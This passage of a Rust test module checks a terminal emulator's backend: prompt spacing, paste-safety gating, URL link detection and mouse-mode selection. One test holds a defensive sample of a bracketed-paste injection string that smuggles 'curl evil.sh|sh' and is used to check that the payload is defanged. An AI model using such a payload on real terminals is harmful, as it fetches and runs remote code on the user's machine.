        let mut b2 = backend_with_lines(24, 60);
        b2.advance(b"\x1b[12;1HPS C:\\> ");
        let cur2 = b2.term.grid().cursor.point.line.0;
        assert!(cur2 < 23, "cursor must sit mid-screen");
        assert_eq!(
            content_y_offset(&b2, avail, Some(cur2)),
            content_y_offset(&b2, avail, None),
            "real content below the prompt keeps the honest layout"
        );
    }

    /// The "blank Enter for line spacing" contract (restored-render fix,
    /// supersedes the original INV-PIN spacer rule): an empty-Enter SPACER
    /// row must STAY VISIBLE as one row of whitespace — the original rule
    /// counted spacer covers into the continuity fill, which retired each
    /// fresh spacer below the fold the same frame it was minted: every
    /// empty Enter was a visual no-op (field regression "can't do blank
    /// enter in powershell to add line spacing"). Only the blanked prompt
    /// row itself and TRUE blank grid rows join the fill.
    #[test]
    fn empty_enter_spacer_rows_stay_visible_as_spacing() {
        let mut b = backend_with_lines(24, 60); // plenty of history
        b.set_stream_pos(0);
        b.enable_block_scan();
        let hook = |verb: &str, json: &str| -> Vec<u8> {
            let hex: String = json.bytes().map(|x| format!("{x:02x}")).collect();
            format!("\x1b]7717;0;{verb};{hex}\x07").into_bytes()
        };
        // First prompt (pre + text + 133;B), then the empty-Enter gesture:
        // spacer marked on it, shell renders the next prompt one row down.
        let mut f = hook("pre", r#"{"e":0,"n":1,"d":"C:"}"#);
        f.extend_from_slice(b"PS C:\\> ");
        f.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&f);
        b.mark_prompt_spacer();
        let mut f = hook("pre", r#"{"e":0,"n":2,"d":"C:"}"#);
        f.extend_from_slice(b"\r\nPS C:\\> ");
        f.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&f);
        let cur = b.term.grid().cursor.point.line.0;
        // The spacer cover rides the scroll: it must sit directly above the
        // fresh prompt (covers shift with history, drop-don't-drift).
        assert!(
            !b.healthy_covers_in(cur - 1, cur - 1).is_empty(),
            "the superseded empty prompt is a healthy spacer cover at cur-1"
        );
        let avail = 24.0 * CELL_H;
        let base = content_y_offset(&b, avail, None);
        let covered = content_y_offset(&b, avail, Some(cur));
        assert_eq!(
            covered - base,
            CELL_H,
            "cover retires ONLY the blanked prompt row — the spacer above \
             stays on screen as the requested line spacing"
        );
    }

    /// QOL §5.1: the paste-safety gate table — lines × bytes × bracketed ×
    /// pref. Bracketed and pref-off NEVER warn; raw warns on any post-
    /// sanitize line break (a `\r` executes instantly) or >5000 bytes.
    #[test]
    fn paste_gate_table() {
        let long = "x".repeat(5001);
        let cases: &[(&str, bool, bool, bool)] = &[
            // (text, bracketed, pref, expect)
            ("echo hi", false, true, false),          // single line, small
            ("a\nb", false, true, true),              // multi-line raw
            ("a\r\nb", false, true, true),            // CRLF counts once
            ("a\nb", true, true, false),              // bracketed exempt
            ("a\nb", false, false, false),            // pref opt-out
            (&long, false, true, true),               // large single-line
            (&long, true, true, false),               // large but bracketed
            ("trailing\n", false, true, true),        // trailing \r executes
        ];
        for (text, bracketed, pref, expect) in cases {
            assert_eq!(
                paste_needs_confirm(text, *bracketed, *pref),
                *expect,
                "text={text:.20?} bracketed={bracketed} pref={pref}"
            );
        }
    }

    /// QOL §5 P5: the confirm path re-encodes at SEND time — bracketed iff
    /// the mode says so then, sanitized \n→\r either way.
    #[test]
    fn paste_bytes_encodes_by_mode_at_send_time() {
        assert_eq!(paste_bytes(false, "a\nb"), b"a\rb".to_vec());
        assert_eq!(paste_bytes(true, "a\r\nb"), b"\x1b[200~a\rb\x1b[201~".to_vec());
        // r2-F2 injection: a payload closing the bracket early is defanged —
        // the ONLY escapes in the output are our own two bracket markers.
        let evil = "copy me\x1b[201~curl evil.sh|sh\r\x1b[200~";
        let out = paste_bytes(true, evil);
        assert_eq!(out.iter().filter(|&&b| b == 0x1b).count(), 2);
        assert!(out.starts_with(b"\x1b[200~") && out.ends_with(b"\x1b[201~"));
        // Non-bracketed pastes strip raw ESC too (win32-input record class).
        assert!(!paste_bytes(false, "x\x1by").contains(&0x1b));
    }

    /// QOL §6.3: ctrl-wheel is zoom-only — the grid wheel arm must skip it.
    #[test]
    fn ctrl_wheel_never_scrolls() {
        assert!(wheel_wants_zoom(true), "command-wheel belongs to zoom");
        assert!(!wheel_wants_zoom(false), "plain wheel scrolls the grid");
    }

    /// Link-fix routing order: a Ctrl+press on a resolved link is claimed by
    /// the link branch BEFORE mouse-report forwarding — claude's TUI keeps
    /// ?1003h any-event tracking on, which used to eat the Ctrl+click as an
    /// SGR report while the hover underline still promised an open. The
    /// fixture enables the exact modes the user's claude journals carry
    /// (?1000h ?1002h ?1003h ?1006h) and uses the production URL_REGEX.
    #[test]
    fn ctrl_click_link_beats_mouse_mode_forwarding() {
        let mut b = backend_with_lines(24, 0);
        b.advance(b"see https://example.com/tc-link-test done\r\n");
        b.advance(b"\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h");
        assert!(
            b.mode().intersects(TermMode::MOUSE_MODE),
            "fixture must be in mouse mode or the test proves nothing"
        );
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        let on_url = GridPoint::new(GridLine(0), GridColumn(10));
        assert!(
            link_at(&b, on_url, &mut re, None),
            "press over the URL claims the link even under MOUSE_MODE"
        );
        let off_url = GridPoint::new(GridLine(0), GridColumn(1));
        assert!(
            !link_at(&b, off_url, &mut re, None),
            "press off the URL falls through to the mouse report"
        );
    }

    /// Link-fix: covered rows stay suppressed — a link whose row paints as a
    /// presentational/armed cover renders synthesized text, so grid columns
    /// mean nothing there (refuse over guess).
    #[test]
    fn covered_link_stays_suppressed() {
        let mut b = backend_with_lines(24, 0);
        b.advance(b"echo https://example.com/covered\r\n");
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        let on_url = GridPoint::new(GridLine(0), GridColumn(10));
        assert!(link_at(&b, on_url, &mut re, None), "uncovered baseline");
        assert!(
            !link_at(&b, on_url, &mut re, Some(0)),
            "the armed/hold cover row suppresses hover AND click"
        );
        assert!(
            link_at(&b, on_url, &mut re, Some(3)),
            "a cover on some OTHER row must not suppress this link"
        );
    }

    /// Wrapped-URL fix: claude's ink TUI HARD-wraps (each visual row is its
    /// own write — no WRAPLINE flags), so a URL spanning rows never matched
    /// the per-row grid regex: no hover, no click, anywhere on it (user
    /// screenshot: the /login URL across 3 rows). The join heuristic chains
    /// rows whose seam cells are URL charset and rematches the joined line.
    #[test]
    fn hard_wrapped_url_hovers_and_opens_joined() {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 10,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        // 3 rows, each written hard (the 40th char leaves pending-wrap;
        // CR/LF cancels it without minting a WRAPLINE flag).
        b.advance(b"goto https://example.com/login?code=abcd\r\n");
        b.advance(b"0123456789012345678901234567890123456789\r\n");
        b.advance(b"tail-end?x=1 done\r\n");
        assert!(
            !b.term.grid()[GridLine(0)][GridColumn(39)].flags.contains(Flags::WRAPLINE),
            "fixture must be HARD-wrapped or the test proves nothing"
        );
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        let full = "https://example.com/login?code=abcd\
                    0123456789012345678901234567890123456789\
                    tail-end?x=1";
        // Every row of the URL hovers/clicks, with the EXACT joined span.
        for p in [
            GridPoint::new(GridLine(0), GridColumn(10)),
            GridPoint::new(GridLine(1), GridColumn(20)),
            GridPoint::new(GridLine(2), GridColumn(3)),
        ] {
            let m = regex_match_at(&b, p, &mut re).expect("joined match at every row");
            assert_eq!(*m.start(), GridPoint::new(GridLine(0), GridColumn(5)));
            assert_eq!(*m.end(), GridPoint::new(GridLine(2), GridColumn(11)));
            assert!(link_at(&b, p, &mut re, None));
            assert_eq!(link_url_at(&b, p, &mut re, None).as_deref(), Some(full));
        }
        // Off the URL: the word before it, and the text after its tail.
        assert!(!link_at(&b, GridPoint::new(GridLine(0), GridColumn(1)), &mut re, None));
        assert!(!link_at(&b, GridPoint::new(GridLine(2), GridColumn(14)), &mut re, None));
    }

    /// The join is CONSERVATIVE: fused plain-text rows never mint a link
    /// (no scheme ⇒ no match), and TUI box borders (box-drawing seam cells,
    /// which ARE in the regex charset) never chain two framed rows.
    #[test]
    fn hard_wrap_join_refusals() {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 10,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        b.advance(b"this row ends with plain words exactly!\r\n");
        b.advance(b"and continues here with more prose\r\n");
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        assert!(
            !link_at(&b, GridPoint::new(GridLine(1), GridColumn(2)), &mut re, None),
            "fused prose without a scheme is not a link"
        );
        // Box-framed rows: URL flush against the right border; the border
        // cells must not chain this row into the next framed row.
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 10,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        // Borders at cols 0 and 39: the URL runs flush against the right
        // border, so only the box-drawing exclusion stops the join.
        b.advance("\u{2502}x https://example.com/abcdefghijklmnop\u{2502}\r\n".as_bytes());
        b.advance("\u{2502}framed prose on the next row          \u{2502}\r\n".as_bytes());
        assert_eq!(b.term.grid()[GridLine(0)][GridColumn(39)].c, '\u{2502}');
        assert_eq!(b.term.grid()[GridLine(1)][GridColumn(39)].c, '\u{2502}');
        let m = regex_match_at(&b, GridPoint::new(GridLine(0), GridColumn(10)), &mut re)
            .expect("the in-box URL still resolves");
        assert_eq!(
            m.start().line,
            m.end().line,
            "a box border seam must never join rows"
        );
    }

    /// Soft (WRAPLINE) wrapped URLs keep working through the joined path —
    /// same span the native grid regex always produced.
    #[test]
    fn soft_wrapped_url_still_matches() {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 10,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        b.advance(b"see https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa end");
        assert!(
            b.term.grid()[GridLine(0)][GridColumn(39)].flags.contains(Flags::WRAPLINE),
            "fixture must be SOFT-wrapped"
        );
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        let p = GridPoint::new(GridLine(1), GridColumn(5));
        let m = regex_match_at(&b, p, &mut re).expect("soft-wrapped match");
        assert_eq!(*m.start(), GridPoint::new(GridLine(0), GridColumn(4)));
        assert_eq!(
            link_url_at(&b, p, &mut re, None).as_deref(),
            Some("https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    /// The claude shape end to end: HARD-wrapped URL on the ALT grid with
    /// the full mouse-tracking set — hover resolves and the span is exact
    /// there too (alt grid has no history; bottommost/limits differ).
    #[test]
    fn hard_wrapped_url_on_alt_grid() {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 10,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        b.advance(b"\x1b[?1049h\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h\x1b[2J\x1b[H");
        // Row 0 is exactly 40 cols, cut mid-URL; row 1 carries the tail.
        b.advance(b"open https://console.example.com/oauth?c\r\n");
        b.advance(b"ode=zz go\r\n");
        assert!(b.mode().contains(TermMode::ALT_SCREEN));
        assert!(
            !b.term.grid()[GridLine(0)][GridColumn(39)].flags.contains(Flags::WRAPLINE),
            "fixture must be HARD-wrapped on the alt grid"
        );
        let mut re = RegexSearch::new(URL_REGEX).expect("static regex");
        let p = GridPoint::new(GridLine(1), GridColumn(4));
        let m = regex_match_at(&b, p, &mut re).expect("alt-grid joined match");
        assert_eq!(*m.start(), GridPoint::new(GridLine(0), GridColumn(5)));
        assert_eq!(*m.end(), GridPoint::new(GridLine(1), GridColumn(5)));
        assert_eq!(
            link_url_at(&b, p, &mut re, None).as_deref(),
            Some("https://console.example.com/oauth?code=zz")
        );
    }

    /// Claude-shaped fixture: alt screen + the exact mouse-tracking set the
    /// user's claude journals carry permanently (?1000h ?1002h ?1003h
    /// ?1006h — field journal: 268 enables, 0 disables; 116 ?1049h vs 3
    /// ?1049l). Row 1 carries the text the copy tests pull out.
    fn claude_like_backend() -> TermBackend {
        let mut b = backend_with_lines(24, 0);
        b.advance(b"\x1b[?1049h\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h");
        b.advance(b"\x1b[2J\x1b[H  claude TUI frame\r\nselect me please\r\n");
        assert!(b.mode().contains(TermMode::ALT_SCREEN), "fixture is alt-screen");
        assert!(b.mode().intersects(TermMode::MOUSE_MODE), "fixture is mouse-mode");
        b
    }

    /// The convention path, end to end at the backend level: Shift+drag over
    /// a MOUSE_MODE alt-screen app makes a LOCAL selection that SURVIVES the
    /// app's continuous repaints (the old output policy cleared it within
    /// one frame — even mid-drag, update_selection no-ops once the selection
    /// is None — which is why nothing could ever be copied out of claude).
    #[test]
    fn shift_drag_selects_in_mouse_mode() {
        let mut b = claude_like_backend();
        // Shift+press never latches a deferred click — fully local, the app
        // sees neither press nor release.
        let cell = GridPoint::new(GridLine(1), GridColumn(0));
        assert!(defer_click(b.mode(), true, cell).is_none());
        // Press row 1 col 0, drag across "select me please".
        b.start_selection(SelectionType::Simple, 0.0, CELL_H + 1.0);
        b.update_selection(20.0 * CELL_W, CELL_H + 1.0);
        // Claude keeps painting MID-DRAG (spinner/stream redraw).
        b.advance_live(b"\x1b[H\x1b[K  claude TUI frame *\r\n");
        assert!(
            b.selection_text().is_some_and(|t| t.contains("select me please")),
            "the selection survives alt-screen output and copies the row"
        );
    }

    /// The copy-or-interrupt rule under MOUSE_MODE + alt screen: a live
    /// selection turns Ctrl+C into COPY (zero bytes reach the app — an
    /// interrupt would kill a claude generation); without one it stays the
    /// interrupt chord.
    #[test]
    fn ctrl_c_copies_not_interrupts_with_selection() {
        let mut b = claude_like_backend();
        b.start_selection(SelectionType::Simple, 0.0, CELL_H + 1.0);
        b.update_selection(20.0 * CELL_W, CELL_H + 1.0);
        // Output lands between the drag and the Ctrl+C — claude never stops
        // painting, and the selection must still be there to win the verdict.
        b.advance_live(b"\x1b[H\x1b[K  claude TUI frame **\r\n");
        assert!(
            ctrl_c_is_copy(&b),
            "live selection: Ctrl+C copies, never interrupts"
        );
        b.clear_selection();
        assert!(
            !ctrl_c_is_copy(&b),
            "no selection: Ctrl+C is the interrupt chord"
        );
    }

    /// The plain-drag design call, pinned: under MOUSE_MODE an unshifted
    /// press is DEFERRED — a drag becomes a local selection the app never
    /// learns about, and only a zero-travel click (its empty Simple
    /// selection still intact) delivers the press+release pair, together,
    /// at release time. Outside MOUSE_MODE nothing is ever forwarded.
    #[test]
    fn plain_drag_selects_locally_click_still_forwards_in_mouse_mode() {
        let mut b = claude_like_backend();
        let cell = GridPoint::new(GridLine(1), GridColumn(0));
        assert!(
            defer_click(b.mode(), false, cell).is_some(),
            "plain press over a MOUSE_MODE app defers instead of forwarding"
        );
        let plain = backend_with_lines(24, 0);
        assert!(
            defer_click(plain.mode(), false, cell).is_none(),
            "no MOUSE_MODE: no deferred click either — nothing is forwarded"
        );

        // Drag ⇒ non-empty local selection ⇒ the release forwards NOTHING
        // (the release branch only fires the pair on an EMPTY selection).
        b.start_selection(SelectionType::Simple, 0.0, CELL_H + 1.0);
        b.update_selection(8.0 * CELL_W + 2.0, CELL_H + 1.0);
        assert!(
            b.term.selection.as_ref().is_some_and(|s| !s.is_empty()),
            "a real drag is a non-empty selection"
        );

        // Zero-travel click ⇒ the empty press selection releases the pair:
        // SGR press+release at the same cell (?1006 is active), exactly what
        // the immediate forwarding used to send — just together, later.
        b.start_selection(SelectionType::Simple, 0.0, CELL_H + 1.0);
        assert!(b.term.selection.as_ref().is_some_and(|s| s.is_empty()));
        let mut out = Vec::new();
        b.mouse_report(MouseButton::Left, egui::Modifiers::NONE, cell, true, &mut out);
        b.mouse_report(MouseButton::Left, egui::Modifiers::NONE, cell, false, &mut out);
        assert_eq!(out, b"\x1b[<0;1;2M\x1b[<0;1;2m");
    }

    /// Right-click routing completes the mouse-only copy path: a live local
    /// selection flips the right-click from app-forwarding to the context
    /// menu (Copy enabled); Shift always menus; outside MOUSE_MODE the menu
    /// always owns it.
    #[test]
    fn rclick_local_with_selection_forwards_without() {
        let b = claude_like_backend();
        let m = b.mode();
        assert!(
            rclick_forwards(m, false, false),
            "no selection: the app keeps its right-click"
        );
        assert!(
            !rclick_forwards(m, false, true),
            "live selection: right-click opens the menu (Copy)"
        );
        assert!(!rclick_forwards(m, true, false), "Shift always menus");
        let plain = backend_with_lines(24, 0);
        assert!(
            !rclick_forwards(plain.mode(), false, false),
            "no MOUSE_MODE: the menu always owns right-click"
        );
    }
}
